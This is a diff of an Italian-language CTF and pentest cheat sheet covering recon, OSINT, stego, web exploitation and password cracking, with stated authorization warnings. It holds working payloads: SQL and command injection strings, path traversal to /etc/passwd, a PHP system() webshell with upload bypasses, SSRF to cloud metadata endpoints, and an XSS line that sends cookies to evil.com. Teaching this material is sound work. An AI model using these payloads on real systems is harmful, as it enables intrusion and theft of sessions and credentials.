@@ -14,6 +14,7 @@
     --accent2: #79c0ff;
     --green: #7ee787;
     --yellow: #f2cc60;
+    --purple: #d2a8ff;
     --code-bg: #1f242c;
   }
   * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -38,7 +39,6 @@
     margin-bottom: 12px;
   }
 
-  /* SEARCH BAR */
   .search-container {
     background: var(--card);
     border: 1px solid var(--border);
@@ -64,9 +64,7 @@
     border-color: var(--accent);
     box-shadow: 0 0 0 2px rgba(255,123,114,0.2);
   }
-  #searchInput::placeholder {
-    color: #8b949e;
-  }
+  #searchInput::placeholder { color: #8b949e; }
   .search-info {
     font-size: 0.75em;
     color: #8b949e;
@@ -165,9 +163,26 @@
     margin: 8px 0;
     font-size: 0.9em;
   }
-  .box-warn { border-left-color: var(--accent); }
+  .box-warn { border-left-color: #ff7b72; }
   .box-info { border-left-color: var(--accent2); }
   .box-ok { border-left-color: var(--green); }
+
+  .why, .how, .when, .next {
+    padding: 8px 10px;
+    border-radius: 4px;
+    margin: 6px 0;
+    font-size: 0.9em;
+    border-left: 3px solid;
+  }
+  .why { background: #201414; border-left-color: var(--accent); }
+  .how { background: #1a1826; border-left-color: var(--purple); }
+  .when { background: #1c2128; border-left-color: var(--yellow); }
+  .next { background: #142019; border-left-color: var(--green); }
+  .why::before { content: "PERCHE': "; color: var(--accent); font-weight: bold; }
+  .how::before { content: "COME: "; color: var(--purple); font-weight: bold; }
+  .when::before { content: "QUANDO: "; color: var(--yellow); font-weight: bold; }
+  .next::before { content: "PROSSIMO PASSO: "; color: var(--green); font-weight: bold; }
+
   table {
     width: 100%;
     border-collapse: collapse;
@@ -196,20 +211,14 @@
   }
   .back-top:active { background: var(--code-bg); }
 
-  /* HIGHLIGHT */
-  mark {
-    background: var(--yellow);
-    color: #000;
-    padding: 0 2px;
-    border-radius: 2px;
-  }
-
+  mark { background: var(--yellow); color: #000; padding: 0 2px; border-radius: 2px; }
   .no-results {
     text-align: center;
     color: #8b949e;
     padding: 20px;
     font-style: italic;
   }
+  .comment { color: #8b949e; font-style: italic; }
 </style>
 </head>
 <body>
@@ -240,639 +249,1036 @@
 <!-- WARM-UP -->
 <section id="warmup">
   <h2>Warm-up (Crypto, OSINT, Stego)</h2>
+  <div class="box box-info">Punti facili in ogni CTF. Prima di buttarti su exploit complessi, risolvi questi. Sono spesso 30-40% del punteggio totale.</div>
 
-  <h3>Crittografia & Encoding</h3>
-  <div class="box box-info">Encoding non è crittografia. Base64/Hex/URL non proteggono nulla.</div>
-  <h4>Riconoscimento al volo</h4>
-  <ul>
-    <li><b>Base64</b>: alfanumerico + <code>+</code> <code>/</code> <code>=</code>, lunghezza multipla di 4</li>
-    <li><b>Hex</b>: solo <code>0-9a-f</code>, lunghezza pari</li>
-    <li><b>URL encoding</b>: sequenze <code>%XX</code></li>
-    <li><b>Unicode escape</b>: <code>\uXXXX</code></li>
-  </ul>
-  <h4>Comandi</h4>
-  <pre>echo -n "testo" | base64
+  <h3>Crittografia &amp; Encoding</h3>
+  <div class="why">La maggior parte delle stringhe "incomprensibili" in CTF è solo codificata (Base64, Hex, URL), non cifrata. Riconoscere la codifica è il primo passo.</div>
+  <div class="how">
+    <ul>
+      <li><b>Base64</b>: alfanumerico + <code>+</code> <code>/</code> <code>=</code>, lunghezza multipla di 4</li>
+      <li><b>Hex</b>: solo <code>0-9a-f</code>, lunghezza pari</li>
+      <li><b>URL encoding</b>: sequenze <code>%XX</code></li>
+      <li><b>Unicode escape</b>: <code>\uXXXX</code></li>
+    </ul>
+    <pre><span class="comment"># Codifica/decodifica base64</span>
+echo -n "testo" | base64
 echo "dGVzdG8=" | base64 -d
+
+<span class="comment"># Codifica/decodifica hex</span>
 echo -n "testo" | xxd -p
 echo "746573746f" | xxd -r -p</pre>
-  <h4>CyberChef</h4>
-  <ul>
-    <li>Usa <b>Magic</b> per decodifiche automatiche</li>
-    <li>Ricette multi-step: Base64 -> Hex -> Gunzip</li>
-    <li>URL: gchq.github.io/CyberChef</li>
-  </ul>
-  <h4>Cifrari classici</h4>
-  <ul>
-    <li><b>Cesare</b>: 25 chiavi, brute force</li>
-    <li><b>Vigenere</b>: analisi frequenze</li>
-    <li><b>XOR</b>: chiave breve, brute force</li>
-  </ul>
-  <h4>Hash</h4>
-  <ul>
-    <li>MD5/SHA1 rotti, SHA256 standard</li>
-    <li>Password: bcrypt, Argon2id</li>
-  </ul>
+  </div>
+  <div class="when">Sempre come prima cosa quando vedi una stringa strana. Prima prova CyberChef con la funzione Magic, poi decodifica manuale.</div>
+  <div class="next">Se Base64 non basta, prova decodifiche multiple (Base64 → Hex → Gunzip). Se non è codifica, potrebbe essere un cifrario classico (Cesare, Vigenère, XOR).</div>
+
+  <h3>Cifrari classici</h3>
+  <div class="why">Cesare, Vigenère, XOR sono i cifrari "storici" che compaiono in CTF come riscaldamento. Non offrono sicurezza reale, ma vanno riconosciuti.</div>
+  <div class="how">
+    <ul>
+      <li><b>Cesare</b>: 25 chiavi possibili. Brute force con dCode o CyberChef.</li>
+      <li><b>Vigenère</b>: analisi frequenze + indice di coincidenza. Tool: dCode.</li>
+      <li><b>XOR</b>: chiave breve → brute force con CyberChef (operazione XOR con chiave variabile).</li>
+    </ul>
+  </div>
+  <div class="when">Quando Base64/Hex falliscono e il testo sembra "quasi italiano/inglese". La presenza di pattern ripetuti suggerisce Vigenère o XOR.</div>
+  <div class="next">Se XOR con chiave di un byte non funziona, prova chiave ripetuta su più byte (Cryptopals Set 1 ha esercizi guidati).</div>
 
   <h3>OSINT</h3>
-  <h4>Google Dorking</h4>
-  <pre>site:target.com filetype:pdf
+  <div class="why">In CTF OSINT significa trovare informazioni su un target (dominio, persona, organizzazione) usando solo fonti pubbliche. A volte la flag è in un metadata, in un vecchio commit GitHub, in un certificato TLS.</div>
+  <div class="how">
+    <pre><span class="comment"># Google Dorking</span>
+site:target.com filetype:pdf
 inurl:admin
-intitle:"index of"</pre>
-  <h4>Subdomain enumeration</h4>
-  <pre>subfinder -d target.com -silent -o subs.txt
+intitle:"index of"
+
+<span class="comment"># Subdomain enumeration</span>
+subfinder -d target.com -silent -o subs.txt
 amass enum -passive -d target.com -o amass.txt
-curl -s "https://crt.sh/?q=target.com&output=json" | jq -r '.[].name_value' | sort -u</pre>
-  <h4>Shodan/Censys</h4>
-  <pre>port:22 country:IT
-org:"Acme Corp"
-ssl:"target.com"</pre>
-  <h4>Metadata</h4>
-  <pre>exiftool foto.jpg
-exiftool documento.pdf</pre>
+
+<span class="comment"># Certificate Transparency (crt.sh)</span>
+curl -s "https://crt.sh/?q=target.com&output=json" | jq -r '.[].name_value' | sort -u
+
+<span class="comment"># Metadata foto</span>
+exiftool foto.jpg</pre>
+  </div>
+  <div class="when">Quando la traccia menziona un dominio, un'organizzazione, una persona, o quando ti danno un'immagine/documento.</div>
+  <div class="next">Se trovi un dominio, passa a subdomain enumeration + crt.sh. Se trovi un'immagine, controlla metadata EXIF (GPS, autore, software).</div>
 
   <h3>Steganografia</h3>
-  <h4>Workflow</h4>
-  <pre>file immagine.png
-exiftool immagine.png
-binwalk immagine.png
-strings immagine.png | less
-zsteg -a immagine.png
-steghide info immagine.jpg
-stegseek immagine.jpg rockyou.txt</pre>
-  <h4>Audio</h4>
-  <ul>
-    <li>Spettrogramma con Audacity</li>
-    <li>DTMF, Morse, SSTV</li>
-  </ul>
-  <h4>Testo</h4>
-  <ul>
-    <li>Zero-width characters</li>
-    <li>Whitespace coding</li>
-    <li>Omoglifi</li>
-  </ul>
+  <div class="why">Nascondere informazioni dentro altre informazioni. In CTF: immagini, audio, testo. La flag è nascosta dentro un file apparentemente innocuo.</div>
+  <div class="how">
+    <pre><span class="comment"># Analisi base (in ordine)</span>
+file immagine.png              <span class="comment"># tipo reale</span>
+exiftool immagine.png          <span class="comment"># metadata</span>
+binwalk immagine.png           <span class="comment"># file appesi</span>
+strings immagine.png | less    <span class="comment"># stringhe ASCII</span>
+zsteg -a immagine.png          <span class="comment"># LSB analysis (PNG/BMP)</span>
+steghide info immagine.jpg     <span class="comment"># presenza payload (JPEG)</span>
+stegseek immagine.jpg rockyou.txt  <span class="comment"># crack passphrase</span></pre>
+  </div>
+  <div class="when">Quando ti danno un'immagine, un audio, o un file binario sospetto.</div>
+  <div class="next">Se zsteg non trova nulla, prova binwalk -e per estrarre file appesi. Se è audio, apri in Audacity e guarda lo spettrogramma. Se è testo, cerca zero-width characters.</div>
   <a class="back-top" href="#">Torna all'indice</a>
 </section>
 
 <!-- R1 -->
 <section id="r1">
-  <h2>1. Recon & Enumeration (R1)</h2>
-  <div class="box box-warn">Passiva prima, attiva dopo. Sempre su scope autorizzato.</div>
+  <h2>1. Recon &amp; Enumeration (R1)</h2>
+  <div class="box box-warn">Passiva prima, attiva dopo. Sempre su scope autorizzato. In CTF lo scope è la macchina/il target assegnato.</div>
+
+  <h3>Perché la recon è la fase più lunga</h3>
+  <div class="why">Il 40-60% del tempo in un engagement reale è recon. Chi bussa a caso si fa beccare; chi osserva bene entra in minuti. In CTF, 10 minuti di recon fanno risparmiare 30 minuti di tentativi a vuoto.</div>
+  <div class="how">Costruisci una mappa: quali porte sono aperte, quali servizi girano, quali versioni, quali path nascosti, quali sottodomini. Ogni informazione orienta la fase successiva.</div>
+  <div class="when">Sempre come primo passo dopo aver letto la traccia. Anche se pensi di sapere già dove attaccare.</div>
+  <div class="next">Dopo la recon, passa alla fase Web (R2) se c'è un servizio HTTP, o Password (R3) se ci sono credenziali, o direttamente Shell (R4) se c'è una vulnerabilità ovvia.</div>
+
+  <h3>Passiva vs Attiva</h3>
+  <div class="why">Passiva = nessun traffico verso il target (fonti pubbliche). Attiva = scansione diretta. Sempre passiva prima, attiva dopo. La passiva produce il 70% di ciò che serve, senza esporsi.</div>
+  <div class="how">
+    <ul>
+      <li><b>Passiva</b>: crt.sh, subfinder, amass, assetfinder, Shodan, Censys, Google Dorking</li>
+      <li><b>Attiva</b>: nmap, masscan, httpx, ffuf, nuclei</li>
+    </ul>
+  </div>
+  <div class="when">Passiva sempre per prima, anche solo 5 minuti. Attiva solo dopo aver identificato i target più promettenti.</div>
+  <div class="next">Dopo la passiva, hai una lista di sottodomini e IP. Passa alla attiva con nmap sui target selezionati.</div>
 
   <h3>Subdomain enumeration</h3>
-  <pre>subfinder -d target.com -all -silent -o subs.txt
+  <div class="why">Un'organizzazione ha decine o centinaia di sottodomini. Alcuni sono dimenticati, di staging, o di sviluppo: spesso meno protetti del sito principale.</div>
+  <div class="how">
+    <pre><span class="comment"># Enumeration passiva multi-fonte</span>
+subfinder -d target.com -all -silent -o subs.txt
 amass enum -passive -d target.com -o amass.txt
-assetfinder --subs-only target.com > asset.txt
-cat subs.txt amass.txt asset.txt | sort -u > all_subs.txt</pre>
+assetfinder --subs-only target.com &gt; asset.txt
 
-  <h3>Nmap</h3>
-  <pre># Scan base
+<span class="comment"># Merge e dedupe</span>
+cat subs.txt amass.txt asset.txt | sort -u &gt; all_subs.txt
+
+<span class="comment"># Certificate Transparency (crt.sh)</span>
+curl -s "https://crt.sh/?q=target.com&output=json" | jq -r '.[].name_value' | sort -u</pre>
+  </div>
+  <div class="when">Sempre quando hai un dominio target. In CTF spesso il dominio è fornito nella traccia o si deduce dal sito.</div>
+  <div class="next">Dopo aver la lista, proba quali rispondono HTTP con httpx. I sottodomini "interessanti" (dev-, staging-, old-, admin-) vanno investigati per primi.</div>
+
+  <h3>Nmap - Port scanning</h3>
+  <div class="why">Nmap è il port scanner di riferimento. Ti dice quali porte sono aperte, quali servizi girano, quali versioni. Senza questo, attacchi alla cieca.</div>
+  <div class="how">
+    <pre><span class="comment"># Scan base (sempre da qui)</span>
 nmap -sV -sC target
 
-# Tutte le porte
+<span class="comment"># Tutte le porte (veloce)</span>
 nmap -p- --min-rate 5000 -T4 target
 
-# Aggressivo
+<span class="comment"># Aggressivo con OS detection</span>
 sudo nmap -sS -sV -sC -O -T4 target -oA scan
 
-# Script specifici
+<span class="comment"># Script specifici</span>
 nmap --script vuln target
 nmap --script smb-enum-shares -p 139,445 target</pre>
+  </div>
+  <div class="when">Sempre dopo la subdomain enumeration. Prima scansione veloce (top 1000 porte), poi -p- se necessario.</div>
+  <div class="next">Guarda l'output: 22 = SSH (prova credenziali), 80/443 = HTTP (passa a R2 Web), 445 = SMB (enumerazione share), 3306 = MySQL (prova accesso), 3389 = RDP.</div>
 
   <h3>Scanner veloci</h3>
-  <pre># Masscan (sempre --rate!)
+  <div class="why">Nmap è completo ma non il più veloce. Per scansioni su range grandi o in CTF con molti target, Masscan/RustScan/naabu sono più rapidi.</div>
+  <div class="how">
+    <pre><span class="comment"># Masscan (sempre con --rate!)</span>
 sudo masscan -p1-65535 203.0.113.0/24 --rate 5000 -oG masscan.gnmap
 
-# RustScan
+<span class="comment"># RustScan (wrapper Nmap)</span>
 rustscan -a target -- -sV -sC
 
-# Naabu
+<span class="comment"># Naabu (pipeline ProjectDiscovery)</span>
 naabu -host targets.txt -p - -rate 500 -o naabu.txt</pre>
+  </div>
+  <div class="when">Quando hai molti target (una /24 o più) o quando Nmap è troppo lento. Poi passi a Nmap mirato sulle porte aperte.</div>
+  <div class="next">Dopo Masscan, estrai la lista IP:porta e passa a Nmap -sV -sC solo su quelle. Combinazione classica: Masscan veloce + Nmap mirato.</div>
 
   <h3>Fingerprinting</h3>
-  <pre>httpx -l subs.txt -status-code -title -tech-detect -o http.txt
-whatweb https://target.com</pre>
+  <div class="why">Sapere che sulla porta 443 c'è "qualcosa" non basta. Dietro una stessa porta possono girare tecnologie diverse. Il fingerprinting identifica con precisione cosa gira: web server, framework, versione.</div>
+  <div class="how">
+    <pre><span class="comment"># httpx - probe HTTP con tech detection</span>
+httpx -l subs.txt -status-code -title -tech-detect -o http.txt
+
+<span class="comment"># WhatWeb - database esteso di fingerprint</span>
+whatweb https://target.com
+
+<span class="comment"># Wappalyzer (estensione browser)</span>
+<span class="comment"># Apri il sito, clicca l'icona, vedi tecnologie</span></pre>
+  </div>
+  <div class="when">Dopo aver identificato host web attivi. Prima di content discovery o test di vulnerabilità.</div>
+  <div class="next">Se vedi WordPress 4.x, Apache 2.2, PHP 5 → cerca CVE specifiche per quelle versioni. Se vedi nginx moderno + React → probabilmente app custom, serve analisi manuale.</div>
 
   <h3>Content discovery</h3>
-  <pre>ffuf -u https://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,403
+  <div class="why">Un web server risponde su /, ma il sito reale ha decine o centinaia di percorsi interni: /admin, /api/v1/, /backup.zip, /.git/. Non tutti sono linkati dalla homepage.</div>
+  <div class="how">
+    <pre><span class="comment"># ffuf - directory fuzzing</span>
+ffuf -u https://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,403
+
+<span class="comment"># feroxbuster - ricorsivo</span>
 feroxbuster -u https://target -w wordlist.txt -d 3 -t 50
+
+<span class="comment"># gobuster - directory + estensioni</span>
 gobuster dir -u https://target -w wordlist.txt -x php,txt,bak</pre>
+  </div>
+  <div class="when">Dopo il fingerprinting. Sempre, perché i path nascosti sono spesso il foothold.</div>
+  <div class="next">Per ogni 200 trovato, APRILO NEL BROWSER. Un /admin/ esposto, un /backup.zip scaricabile, un /.env leggibile è il foothold. Non lasciare nessun 200 "da guardare dopo".</div>
 
   <h3>Nuclei</h3>
-  <pre>nuclei -l http.txt -severity medium,high,critical -rate-limit 30 -o findings.txt
-nuclei -update-templates</pre>
+  <div class="why">Nuclei è un vulnerability scanner template-driven. 8.000+ template YAML per CVE note, misconfigurazioni, default credentials, endpoint esposti. Trasforma la conoscenza di vulnerabilità in verifiche riproducibili.</div>
+  <div class="how">
+    <pre><span class="comment"># Scan con tutti i template, severity medium+</span>
+nuclei -l http.txt -severity medium,high,critical -rate-limit 30 -o findings.txt
 
-  <h3>Pipeline completa</h3>
-  <pre>subfinder -d target.com -silent | dnsx -silent | naabu -silent -p 80,443,8080,8443 | httpx -silent | nuclei -silent -severity medium,high,critical</pre>
+<span class="comment"># Update template (regolarmente)</span>
+nuclei -update-templates
 
-  <h3>Cosa cercare</h3>
-  <ul>
-    <li>Software vecchio: Apache 2.2, PHP 5, WordPress 4.x</li>
-    <li>File esposti: <code>.env</code>, <code>.git/</code>, backup, log</li>
-    <li>Admin panel: <code>/admin/</code>, <code>/wp-admin/</code>, <code>/phpmyadmin/</code></li>
-    <li>API docs: <code>/swagger-ui/</code>, <code>/api-docs</code></li>
-    <li>Subdomain takeover (CNAME orfani)</li>
-  </ul>
+<span class="comment"># Solo template di una categoria</span>
+nuclei -l http.txt -t cves/</pre>
+  </div>
+  <div class="when">Dopo content discovery. Sempre con --rate-limit quando entri in un nuovo scope.</div>
+  <div class="next">Nuclei produce findings con severity. I critical/high vanno investigati per primi: spesso sono il foothold diretto. Se non trova nulla, torna a content discovery con wordlist più grandi o passa all'analisi manuale (R2).</div>
+
+  <h3>Pipeline completa ProjectDiscovery</h3>
+  <div class="why">La pipeline standard che ogni bug hunter moderno ha come script personale. Una riga che parte dal dominio e produce findings.</div>
+  <div class="how">
+    <pre>subfinder -d target.com -silent | dnsx -silent | naabu -silent -p 80,443,8080,8443 | httpx -silent | nuclei -silent -severity medium,high,critical</pre>
+  </div>
+  <div class="when">Come primo passo in una CTF web. 30-60 minuti di runtime su target medio, output completo in una cartella.</div>
+  <div class="next">Dall'output della pipeline: identifica i 5-10 target più promettenti e passa all'analisi manuale con Burp Suite (R2).</div>
+
+  <h3>Cosa cercare nell'output</h3>
+  <div class="why">Sei categorie di opportunità che emergono dalla recon. Ogni categoria è un potenziale foothold.</div>
+  <div class="how">
+    <ol>
+      <li><b>Software vecchio</b>: Apache 2.2, PHP 5, WordPress 4.x → CVE note</li>
+      <li><b>Configurazioni errate</b>: bucket S3 pubblici, Elasticsearch senza auth, admin panel con default credentials</li>
+      <li><b>Subdomain takeover</b>: CNAME orfani verso servizi non più attivi</li>
+      <li><b>File esposti</b>: .env, .git/, backup, log</li>
+      <li><b>API senza auth</b>: Swagger UI pubblica, GraphQL introspection</li>
+      <li><b>App custom</b>: applicazioni proprietarie con vulnerabilità logiche</li>
+    </ol>
+  </div>
+  <div class="when">Dopo aver girato la pipeline. Ogni categoria ha un capitolo dedicato nei prossimi step.</div>
+  <div class="next">Per file esposti (.env, .git/), scarica e analizza (spesso contengono credenziali). Per app custom, passa a R2 Web Exploitation.</div>
   <a class="back-top" href="#">Torna all'indice</a>
 </section>
 
 <!-- R2 -->
 <section id="r2">
   <h2>2. Web Exploitation (R2)</h2>
-  <div class="box box-warn">Scope scritto obbligatorio. Exploitation senza autorizzazione è reato.</div>
+  <div class="box box-warn">Scope scritto obbligatorio. Exploitation senza autorizzazione è reato. In CTF lo scope è la macchina assegnata.</div>
+
+  <h3>Perché il web è la superficie d'attacco primaria</h3>
+  <div class="why">Ogni applicazione pubblica ha un'interfaccia web. Ogni interfaccia web è una potenziale porta d'ingresso. In CTF il 70% dei foothold arriva dal web.</div>
+  <div class="how">OWASP Top 10 è la classificazione di riferimento: Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration, Vulnerable Components, Auth Failures, Software/Data Integrity, Logging Failures, SSRF.</div>
+  <div class="when">Sempre dopo aver identificato un servizio HTTP attivo. Il web è la prima cosa da testare.</div>
+  <div class="next">Se trovi SQLi → dump credenziali → passa a R3 (Password) o R4 (Shell). Se trovi RCE → R4 (Shell) direttamente.</div>
+
+  <h3>Burp Suite - Lo strumento principale</h3>
+  <div class="why">Burp è un proxy HTTP che si frappone tra browser e target. Ogni richiesta passa per Burp: la vedi, la modifichi, la rilanci. È lo strumento di lavoro quotidiano per web testing.</div>
+  <div class="how">
+    <pre><span class="comment"># Setup</span>
+1. Avvia Burp Community
+2. Proxy -> Options -> 127.0.0.1:8080
+3. Browser -> proxy 127.0.0.1:8080
+4. Installa certificato: http://burp -> cacert.der
+5. Importa in browser come CA fidata
+
+<span class="comment"># Schede principali</span>
+Proxy        - intercetta traffico
+HTTP history - log richieste
+Repeater     - modifica e rilancia
+Intruder     - fuzzing parametri
+Decoder      - encoding/decoding</pre>
+  </div>
+  <div class="when">Sempre, in ogni CTF web. Configura Burp prima di iniziare a navigare il target.</div>
+  <div class="next">Naviga il sito con Burp attivo: ogni click popola la site map. Poi manda le richieste interessanti a Repeater per test manuali.</div>
 
   <h3>SQL Injection</h3>
-  <pre># Test manuale
+  <div class="why">SQLi è la vulnerabilità web più antica ancora significativa. L'applicazione costruisce query SQL concatenando input utente. L'attaccante riscrive la query.</div>
+  <div class="how">
+    <pre><span class="comment"># Test manuale</span>
 ' OR 1=1--
 ' UNION SELECT null,null--
 ' AND SLEEP(5)--
 
-# Sqlmap
+<span class="comment"># Sqlmap (automatizzato)</span>
 sqlmap -u "https://target/product?id=1" --batch
 sqlmap -r request.txt --batch --dbs
 sqlmap -r request.txt --batch -D db -T users --dump
 sqlmap -r request.txt --batch --os-shell</pre>
-
-  <h3>XSS</h3>
-  <pre>&lt;script&gt;alert(1)&lt;/script&gt;
-&lt;img src=x onerror=alert(1)&gt;
-&lt;svg onload=alert(1)&gt;</pre>
-  <ul>
-    <li>Rubare cookie: <code>fetch('https://evil.com/c?c='+document.cookie)</code></li>
-    <li>Se HttpOnly, no cookie. Usa per CSRF o phishing on-domain</li>
-  </ul>
-
-  <h3>LFI / Path Traversal</h3>
-  <pre>?file=../../../../etc/passwd
-?file=....//....//etc/passwd
-?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd</pre>
-  <div class="box box-info">Log poisoning: inietta PHP in User-Agent, poi includi il log.</div>
+  </div>
+  <div class="when">Quando un parametro va in query SQL (id=, user=, search=). Testa sempre con apostrofo singolo per primo.</div>
+  <div class="next">Se SQLi funziona: dumpa le tabelle users (credenziali) → usa le credenziali per login (R3) o prova --os-shell per RCE diretto (R4).</div>
 
   <h3>Command Injection</h3>
-  <pre>; cat /etc/passwd
+  <div class="why">Analogo di SQLi ma contro la shell di sistema. L'applicazione passa input utente a un comando shell. L'attaccante inserisce comandi aggiuntivi.</div>
+  <div class="how">
+    <pre><span class="comment"># Separatori di comando</span>
+; cat /etc/passwd
 | whoami
-&& id
+&amp;&amp; id
 $(cat /etc/passwd)
-`id`</pre>
-  <ul>
-    <li>Blind: time-based (<code>sleep 5</code>), out-of-band (<code>curl interact.sh</code>)</li>
-  </ul>
+`id`
+
+<span class="comment"># Blind: time-based</span>
+; sleep 5
+
+<span class="comment"># Blind: out-of-band</span>
+; curl abc123.interact.sh/$(whoami)</pre>
+  </div>
+  <div class="when">Quando un parametro va in un comando shell (ping, nslookup, convert). Cerca funzionalità che invocano comandi di sistema.</div>
+  <div class="next">Se command injection funziona: passa direttamente a R4 (Shell). Genera reverse shell con revshells.com per il contesto (Linux/Windows, bash/PowerShell).</div>
+
+  <h3>LFI / Path Traversal</h3>
+  <div class="why">L'applicazione costruisce path di filesystem concatenando input utente. L'attaccante include ../ per uscire dalla directory prevista e leggere file altrove.</div>
+  <div class="how">
+    <pre><span class="comment"># Path traversal canonici</span>
+?file=../../../../etc/passwd
+?file=....//....//etc/passwd
+?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+<span class="comment"># Log poisoning (se include log)</span>
+<span class="comment"># 1. Invia User-Agent con PHP: <?php system($_GET['cmd']); ?></span>
+<span class="comment"># 2. Includi /var/log/apache2/access.log via LFI</span>
+<span class="comment"># 3. Chiama ?cmd=whoami</span></pre>
+  </div>
+  <div class="when">Quando un parametro accetta un nome file o path (?file=, ?page=, ?template=).</div>
+  <div class="next">Se LFI funziona: leggi /etc/passwd per capire il sistema, /proc/self/environ per env vars, ~/.ssh/id_rsa per chiavi. Log poisoning → RCE → R4.</div>
 
   <h3>File Upload</h3>
-  <pre>&lt;?php system($_GET['cmd']); ?&gt;</pre>
-  <ul>
-    <li>Bypass: doppia estensione (<code>shell.php.jpg</code>), null byte (<code>shell.php%00.jpg</code>), Content-Type, magic bytes</li>
-    <li><b>Non usare webshell scaricate da internet</b> (backdoor)</li>
-  </ul>
+  <div class="why">Se l'applicazione accetta upload di file e li serve dal web server, l'attaccante carica una webshell e la chiama via URL. RCE immediato.</div>
+  <div class="how">
+    <pre><span class="comment"># Webshell PHP minimale</span>
+&lt;?php system($_GET['cmd']); ?&gt;
+
+<span class="comment"># Bypass comuni</span>
+shell.php.jpg              <span class="comment"># doppia estensione</span>
+shell.php%00.jpg           <span class="comment"># null byte (PHP vecchio)</span>
+shell.phtml, shell.php5    <span class="comment"># estensioni alternative</span>
+Content-Type: image/jpeg   <span class="comment"># header manipolato</span>
+GIF89a&lt;?php ...            <span class="comment"># polyglot con magic bytes</span></pre>
+  </div>
+  <div class="when">Ogni volta che c'è un form di upload. Anche se sembra "solo immagini".</div>
+  <div class="next">Se upload funziona: chiama la webshell via URL (<code>/uploads/shell.php?cmd=whoami</code>) → RCE. Passa a R4 (Shell) per stabilizzare.</div>
 
   <h3>SSRF</h3>
-  <pre>http://169.254.169.254/latest/meta-data/  # AWS
-http://metadata.google.internal/          # GCP
-http://127.0.0.1/admin/
-http://localhost:8080/</pre>
+  <div class="why">L'applicazione server-side accetta un URL come input e va a scaricarlo. L'attaccante fornisce URL che puntano a risorse interne non raggiungibili dall'esterno.</div>
+  <div class="how">
+    <pre><span class="comment"># Target tipici SSRF</span>
+http://169.254.169.254/latest/meta-data/  <span class="comment"># AWS</span>
+http://metadata.google.internal/          <span class="comment"># GCP</span>
+http://127.0.0.1/admin/                   <span class="comment"># localhost</span>
+http://localhost:8080/                    <span class="comment"># servizi interni</span>
+
+<span class="comment"># Bypass filtri</span>
+http://127.1/
+http://0177.0.0.1/
+http://2130706433/</pre>
+  </div>
+  <div class="when">Quando un parametro accetta un URL (?url=, ?avatar=, ?webhook=). Sempre in ambienti cloud.</div>
+  <div class="next">Se SSRF funziona su metadata cloud: estrai credenziali AWS/GCP → accesso a infrastruttura cloud. Se funziona su localhost: raggiungi pannelli admin interni.</div>
 
   <h3>IDOR / Broken Access Control</h3>
-  <ul>
-    <li>Cambia <code>id=42</code> in <code>id=43</code></li>
-    <li>Usa due account: uno per generare richieste, l'altro per testare</li>
-    <li>Autorize (Burp) automatizza</li>
-  </ul>
+  <div class="why">L'endpoint accede a oggetti senza verificare che appartengano all'utente autenticato. Cambiando un ID, accedi ai dati di altri.</div>
+  <div class="how">
+    <pre><span class="comment"># Cambia ID numerico</span>
+GET /api/users/42/profile → GET /api/users/43/profile
 
-  <h3>Burp Suite</h3>
-  <ul>
-    <li><b>Proxy</b>: intercetta traffico</li>
-    <li><b>Repeater</b>: modifica e rilancia richieste</li>
-    <li><b>Intruder</b>: fuzzing parametri</li>
-    <li><b>Decoder</b>: base64, URL, hex</li>
-    <li>Estensioni: Logger++, Autorize, Turbo Intruder, Param Miner</li>
-  </ul>
+<span class="comment"># Cambia UUID (più difficile)</span>
+<span class="comment"># Cerca UUID altrove nel sistema (email, condivisioni, log)</span>
+
+<span class="comment"># Testing con due account</span>
+<span class="comment"># Account A: annota gli ID delle proprie risorse</span>
+<span class="comment"># Account B: prova a inserire gli ID di A</span></pre>
+  </div>
+  <div class="when">Sempre quando vedi un parametro id=, user_id=, invoice_id=. È la vulnerabilità #1 della Top 10.</div>
+  <div class="next">Se IDOR funziona: dumpa dati di altri utenti (email, ordini, fatture). Spesso porta a privilege escalation orizzontale o verticale.</div>
+
+  <h3>XSS</h3>
+  <div class="why">Inietti JavaScript in una pagina del target. Il browser della vittima lo esegue credendo che provenga dal sito legittimo. Utile per rubare cookie, fare richieste autenticate, phishing on-domain.</div>
+  <div class="how">
+    <pre><span class="comment"># Payload base</span>
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+
+<span class="comment"># Rubare cookie</span>
+&lt;script&gt;fetch('https://evil.com/c?c='+document.cookie)&lt;/script&gt;</pre>
+  </div>
+  <div class="when">Quando un input viene riflesso nella pagina senza encoding (reflected) o salvato e mostrato ad altri (stored).</div>
+  <div class="next">Se XSS funziona: se la cookie non è HttpOnly, rubala e hijacka la sessione. Altrimenti usa XSS per CSRF o phishing on-domain.</div>
 
   <h3>PortSwigger Web Security Academy</h3>
-  <div class="box box-ok">La risorsa numero 1 per pratica web. 250+ lab gratuiti. Usa Burp Community.</div>
+  <div class="why">La risorsa numero 1 per pratica web. 250+ lab gratuiti, teoria + pratica, Burp-native. Il percorso didattico di riferimento al 2026.</div>
+  <div class="how">Registrati su portswigger.net/web-security. Parti dalla categoria SQL Injection. Completa tutti i lab nell'ordine. Poi XSS, poi Access Control, poi SSRF.</div>
+  <div class="when">Sempre, come pratica. In CTF, se hai già fatto i lab, riconosci i pattern immediatamente.</div>
+  <div class="next">Dopo 50 lab completati, sei pronto per bug bounty pubblici con scope ampi. In CTF, i pattern di PortSwigger coprono il 70% delle challenge web.</div>
   <a class="back-top" href="#">Torna all'indice</a>
 </section>
 
 <!-- R3 -->
 <section id="r3">
   <h2>3. Password Attacks (R3)</h2>
+  <div class="box box-info">Crackare hash offline è silenzioso e potente. In CTF, se trovi un hash, questo è il capitolo che ti serve.</div>
+
+  <h3>Perché le password sono ancora il perno</h3>
+  <div class="why">Nonostante MFA e passkey, la password resta il metodo di autenticazione più diffuso. E le password deboli restano endemiche. Il cracking offline è silenzioso: nessun log nel target.</div>
+  <div class="how">Due macro-scenari: offline (hai hash, calcoli a casa) e online (attacchi un servizio vivo, con rate limiting). In CTF quasi sempre offline.</div>
+  <div class="when">Quando trovi un hash nel corso di un'altra fase (SQLi dump, config file, memoria).</div>
